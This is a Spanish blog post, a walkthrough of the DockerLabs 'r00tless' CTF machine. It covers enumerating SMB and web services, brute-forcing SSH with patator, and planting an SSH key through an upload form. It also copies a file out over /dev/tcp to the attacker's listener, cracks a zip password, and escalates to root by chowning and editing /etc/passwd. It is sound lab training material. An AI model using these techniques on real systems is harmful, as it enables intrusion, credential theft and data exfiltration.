@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | r00tless</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">r00tless</h2>
+          <small class="date">02 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">dificil</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/r00tless/r00tless.png" alt="image"></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que use el modo agresivo <code class="language-plaintext highlighter-rouge">-T 4</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.18.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-T</span> 4 <span class="nt">-v</span> 172.18.0.2
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+</code></pre></div></div>
+
+<p>Vemos que tiene los puertos <strong>22, 80, 139, 445</strong> abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,139,445 <span class="nt">-v</span> 172.18.0.2
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 fa:7b:d3:96:f6:83:bb:bd:24:86:b4:a8:f6:59:c3:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 29:49:38:ae:44:75:d8:88:2a:b6:98:55:00:bd:24:76 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Subir Archivo
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+</code></pre></div></div>
+
+<p>Enumeramos <strong>samba:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-a</span> 172.18.0.2
+Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        read_only_share Disk      
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>64a2dd61671c server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+
+S-1-22-1-1000 Unix User<span class="se">\r</span>oot-false <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1001 Unix User<span class="se">\s</span>ambauser <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1002 Unix User<span class="se">\l</span>ess <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1003 Unix User<span class="se">\p</span>asssamba <span class="o">(</span>Local User<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Entre otras cosas encontramos un recurso compartido, <strong>read_only_share</strong>, y cuatro usuarios: <strong>root-false, sambauser, less y passsamba</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>crackmapexec smb <span class="nt">-u</span> root-false <span class="nt">-p</span> passsamba <span class="nt">--local-auth</span> 172.18.0.2
+SMB         172.18.0.2      445    64A2DD61671C     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:64A2DD61671C<span class="o">)</span> <span class="o">(</span>domain:64A2DD61671C<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         172.18.0.2      445    64A2DD61671C     <span class="o">[</span>+] 64A2DD61671C<span class="se">\r</span>oot-false:passsamba
+</code></pre></div></div>
+
+<p>Ahora pasamos a enumerar el servicio web. Primero hacemos un ataque de fuerza bruta para encontrar directorios y ficheros:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://172.18.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php,.txt,.zip
+200      GET        1l       10w       56c http://172.18.0.2/upload.php
+200      GET       94l      183w     2410c http://172.18.0.2/200      GET        2l       16w       78c http://172.18.0.2/readme.txt
+</code></pre></div></div>
+
+<p>Llama la atención el fichero <strong>readme.txt</strong>. Lo vemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://172.18.0.2/readme.txt
+
+It may be that the file that is being uploaded is being uploaded <span class="k">in </span>a .ssh/?
+</code></pre></div></div>
+
+<p>Parece que la url <a href="http://172.18.0.2/upload.php"><strong>http://172.18.0.2/upload.php</strong></a> sube el fichero al directorio <strong>.ssh</strong> de alguno de los usuarios que hemos descubierto. Vamos a crear un par de claves públicas/privadas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creamos las claves</span>
+ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
+
+<span class="c"># Creamos el fichero authorized_keys</span>
+<span class="nb">cat </span>id.pub <span class="o">&gt;</span> authorized_keys
+</code></pre></div></div>
+
+<p>Subimos el fichero <strong>authorized_keys:</strong></p>
+
+<p><img src="/assets/images/r00tless/1.png" alt="image"></p>
+
+<p>No sabemos a que usuario pertenece el directorio <strong>.ssh.</strong> En este caso voy a usar el script <strong>patator</strong>. Primero creamos un fichero <strong>users.txt</strong> con los nombres de los usuarios que hemos descubierto y después ejecutamos el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">keyfile</span><span class="o">=</span><span class="nb">id </span><span class="nv">0</span><span class="o">=</span>users.txt
+23:37:20 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
+23:37:20 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
+23:37:21 patator    INFO - 1     22     0.072 | root-false                         |     1 | Authentication failed.
+23:37:21 patator    INFO - 1     22     0.018 | sambauser                          |     2 | Authentication failed.
+23:37:21 patator    INFO - 0     40     0.025 | passsamba                          |     3 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
+</code></pre></div></div>
+
+<p>Como podemos ver con el user <strong>passsamba</strong> obtendríamos acceso al sistema.</p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Nos conectamos al sistema usando la clave privada:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> <span class="nb">id </span>passsamba@172.18.0.2
+Welcome to Ubuntu 24.04 LTS <span class="o">(</span>GNU/Linux 6.8.11-amd64 x86_64<span class="o">)</span>
+passsamba@64a2dd61671c:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Leemos el fichero <strong>note.txt</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 
+
+What would <span class="s2">"sambaarribasiempre"</span> be used <span class="k">for</span>?
+</code></pre></div></div>
+
+<p>Veamos para que sirve… usando <strong>patator</strong> de nuevo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>sambaarribasiempre <span class="nv">0</span><span class="o">=</span>users.txt
+23:40:33 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
+23:40:33 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
+23:40:33 patator    INFO - 0     40     0.086 | sambauser                          |     2 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
+23:40:36 patator    INFO - 1     22     2.671 | passsamba                          |     3 | Authentication failed.
+23:40:36 patator    INFO - 1     22     2.920 | root-false                         |     1 | Authentication failed.
+</code></pre></div></div>
+
+<p>Son las credenciales de <strong>sambauser</strong>.</p>
+
+<h1 id="movimientos-laterales">Movimientos laterales</h1>
+
+<p>Nos cambiamos al user <strong>sambauser</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span>su sambauser
+Password: 
+sambauser@64a2dd61671c:/home/passsamba<span class="nv">$ </span><span class="nb">cd
+</span>sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+sambauser@64a2dd61671c:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Buscamos donde está ubicado el recurso compartido en el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:/<span class="nv">$ </span>find / <span class="nt">-name</span> read_only_share 2&gt;/dev/null
+/srv/samba/read_only_share
+</code></pre></div></div>
+
+<p>Encontramos un fichero <strong>secret.txt</strong>. Nos lo pasamos a nuestra máquina, para ello nos ponemos a la escucha con <strong>nc</strong> redirigiendo la salida al fichero secret.txt y nos lo mandamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888 <span class="o">&gt;</span> secret.zip
+listening on <span class="o">[</span>any] 8888 ...
+
+sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /srv/samba/read_only_share/secret.zip <span class="o">&gt;</span> /dev/tcp/172.18.0.1/8888
+</code></pre></div></div>
+
+<p>Con <strong>patator</strong> y el módulo <strong>unzip_pass</strong> obtenemos la contraseña del fichero zip:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator unzip_pass <span class="nv">zipfile</span><span class="o">=</span>secret.zip <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:code!<span class="o">=</span>0
+23:50:13 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
+23:50:13 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
+23:50:16 patator    INFO - 0     82     0.006 | qwert
+</code></pre></div></div>
+
+<p>Lo descomprimimos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x secret.zip
+
+<span class="nv">$ </span><span class="nb">cat </span>secret.txt
+root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ<span class="o">==</span>
+</code></pre></div></div>
+
+<p>Y desciframos la clave:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ=='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+passwordbadsecureultra
+</code></pre></div></div>
+
+<p>Nos movemos a <strong>root-false</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:~<span class="nv">$ </span>su root-false
+Password: 
+root-false@64a2dd61671c:/home/sambauser<span class="nv">$ </span><span class="nb">whoami
+</span>root-false
+</code></pre></div></div>
+
+<p>Leemos el mensaje:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>message.txt 
+
+Mario, remember this word, <span class="k">then </span>the boss will get angry:
+
+<span class="s2">"pinguinodemarioelmejor"</span>
+</code></pre></div></div>
+
+<p>Buscando por el sistema encontramos que hay una segunda web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/apache2/sites-available/
+total 16
+<span class="nt">-rw-r--r--</span> 1 root root 1286 Mar 18 13:35 000-default.conf
+<span class="nt">-rw-r--r--</span> 1 root root 4573 Mar 18 13:35 default-ssl.conf
+<span class="nt">-rw-r--r--</span> 1 root root  386 Aug 27 11:03 second-site.conf
+</code></pre></div></div>
+
+<p>Vemos que contiene:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /etc/apache2/sites-available/second-site.conf 
+&lt;VirtualHost 10.10.11.5:80&gt;
+    ServerName 10.10.11.5
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/second-site
+
+    &lt;Directory /var/www/second-site&gt;
+        Options Indexes FollowSymLinks
+        AllowOverride None
+        Require all granted
+    &lt;/Directory&gt;
+
+    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+&lt;/VirtualHost&gt;
+</code></pre></div></div>
+
+<p>Vemos que la web hay un formulario para hacer login. Tras probar con los usuarios que conocemos y no obtener acceso probamos con el user mario y obtenemos acceso. Como vemos, usando -vvv en curl, vemos que la respuesta ha sido <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code> y nos redirige a <code class="language-plaintext highlighter-rouge">Location: super_secure_page/admin.php</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl <span class="nt">-vvv</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span>  <span class="nt">-d</span> <span class="s1">'username=mario&amp;password=pinguinodemarioelmejor'</span> http://10.10.11.5/
+<span class="k">*</span>   Trying 10.10.11.5:80...
+<span class="k">*</span> Connected to 10.10.11.5 <span class="o">(</span>10.10.11.5<span class="o">)</span> port 80
+<span class="o">&gt;</span> POST / HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.5
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span> Content-Length: 46
+<span class="o">&gt;</span> 
+&lt; HTTP/1.1 302 Found
+&lt; Date: Mon, 02 Sep 2024 22:24:41 GMT
+&lt; Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Location: super_secure_page/admin.php
+&lt; Content-Length: 0
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+&lt; 
+<span class="k">*</span> Connection <span class="c">#0 to host 10.10.11.5 left intact</span>
+</code></pre></div></div>
+
+<p>Accedemos a la nueva ruta y en el código fuente encontramos el siguiente comentario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/super_secure_page/admin.php
+
+&lt;<span class="o">!</span><span class="nt">--ultramegatextosecret</span>.txt--&gt;
+</code></pre></div></div>
+
+<p>Accedemos al fichero:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.11.5/ultramegatextosecret.txt
+
+En el reino de los hongos, se encontraba un lugar mágico y poco conocido: el Bosque de Nieve Eterna. Este bosque estaba cubierto de un manto blanco y brillante todo el año, y albergaba muchas criaturas fantásticas y secretos ocultos. Entre ellos, había una leyenda que hablaba de un pingüino muy especial que guardaba un gran secreto.
+
+El pingüino en cuestión no era un pingüino común. Se llamaba Pinguino y era el guardián de un antiguo artefacto mágico conocido como el Cristal de la Aurora. Según la leyenda, el Cristal tenía el poder de controlar el clima y podía traer tanto la eterna primavera como un invierno sin fin, dependiendo de la voluntad de su portador.
+
+Una tarde, mientras Mario exploraba el Bosque de Nieve Eterna, llegó a un claro donde vio a Pinguino deslizarse alegremente por una pista de hielo. Mario, siempre curioso, se acercó al pingüino y le preguntó sobre el cristal.
+
+Pinguino, con una mirada sabia en sus ojos, le dijo a Mario que el Cristal de la Aurora estaba escondido en una cueva secreta bajo el lago helado del bosque. Sin embargo, solo el corazón puro y valiente de un verdadero héroe podría encontrarlo. La entrada a la cueva estaba oculta por una mágica capa de hielo que solo se derretía cuando alguien con buenas intenciones realizaba un acto de bondad.
+
+Mario decidió aceptar el desafío. Durante su travesía, ayudó a los habitantes del bosque: rescató a un grupo de conejos atrapados en una tormenta de nieve, reparó una antigua fuente que había sido dañada por un deshielo imprevisto y, sobre todo, demostró su valentía enfrentando a una banda de Koopa Troopas que habían estado causando estragos en la región.
+
+Al realizar estos actos de bondad, el hielo sobre el lago comenzó a derretirse, revelando una entrada oculta en la cueva. Mario entró con cuidado y, con la guía de Pinguino, encontró el Cristal de la Aurora brillando en su pedestal.
+
+El pingüino le explicó que el cristal no solo tenía el poder de controlar el clima, sino que también representaba el equilibrio y la armonía entre las estaciones. Mario comprendió que era esencial mantener ese equilibrio para el bienestar de todo el reino.
+
+Con el Cristal_de_la_Aurora a salvo, Mario y Pinguino regresaron al claro del bosque. El pingüino le agradeció a Mario por su valentía y bondad, y le dijo que siempre podría contar con el bosque para cualquier futuro desafío.
+
+Desde ese día, Mario visitó el Bosque de Nieve Eterna cada vez que necesitaba un consejo sabio, y la leyenda del pingüino guardián del cristal se convirtió en una historia popular en el Reino de los Hongos, recordando a todos que la bondad y la valentía siempre encuentran su recompensa.
+
+by less
+
+</code></pre></div></div>
+
+<p>Lo único que llama la atención es <strong>Cristal_de_la_Aurora.</strong> Probamos a usarlo para movernos a <strong>less:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>su less
+Password: 
+less@64a2dd61671c:/home/root-false<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que puede ejecutar como <strong>root</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>less on 64a2dd61671c:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User less may run the following commands on 64a2dd61671c:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /bin/chown
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vamos a cambiar los permisos al fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para que sea propiedad de <strong>less</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo chown </span>less:less /etc/passwd
+</code></pre></div></div>
+
+<p>Después editamos el fichero. Borramos la <strong>x</strong> que esta entre root y 0.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>nano /etc/passwd
+<span class="c"># Antes</span>
+root:x:0:0:root:/root:/bin/bash
+
+<span class="c"># Después</span>
+root::0:0:root:/root:/bin/bash
+</code></pre></div></div>
+
+<p>Y con ese cambio nos podemos logear como root sin contraseña.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>su
+root@64a2dd61671c:/home/less# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@64a2dd61671c:/home/less#
+</code></pre></div></div>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
